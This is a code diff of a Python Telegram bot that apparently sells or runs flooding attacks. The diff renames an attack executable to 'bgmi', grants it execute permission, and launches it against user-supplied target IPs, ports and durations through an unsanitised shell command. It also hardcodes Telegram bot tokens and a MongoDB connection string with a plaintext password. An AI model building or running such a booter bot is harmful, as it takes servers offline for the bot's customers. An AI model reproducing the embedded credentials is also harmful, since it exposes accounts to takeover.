@@ -15,21 +15,21 @@ import aiohttp
 from telebot.types import ReplyKeyboardMarkup, KeyboardButton
 #from keepalive import keep_alive
 loop = asyncio.get_event_loop()
-Smokie_path = 'Smokie'
+bgmi_path = 'bgmi'
 
 # Grant execute permission to the file
 
 try:
 
-    os.chmod(Smokie_path, 0o755)  # 755 grants execute permissions for all users
+    os.chmod(bgmi_path, 0o755)  # 755 grants execute permissions for all users
 
-    print(f"Execute permission granted for {Smokie_path}.")
+    print(f"Execute permission granted for {bgmi_path}.")
 
 except Exception as e:
 
     print(f"Failed to set execute permission: {e}")
     
-TOKEN = '7422017555:AAG_M-RTjwEvlP61YkBsVTnUpDC_SJrKYIA'
+TOKEN = '7385947182:AAHvAtoo8R5XtdJ83Ibgcqo2giJ4cJJzteM'
 MONGO_URI = 'mongodb+srv://VIKASH:BadnamBadshah@cluster0.jv9he.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0&tlsAllowInvalidCertificates=true'
 FORWARD_CHANNEL_ID = -1002226609740
 CHANNEL_ID = -1002226609740
@@ -97,7 +97,7 @@ async def start_asyncio_loop():
         await asyncio.sleep(REQUEST_INTERVAL)
 
 async def run_attack_command_async(target_ip, target_port, duration):
-    process = await asyncio.create_subprocess_shell(f"./Smokie {target_ip} {target_port} {duration} 400")
+    process = await asyncio.create_subprocess_shell(f"./bgmi {target_ip} {target_port} {duration}")
     await process.communicate()
 
 def is_user_admin(user_id, chat_id):
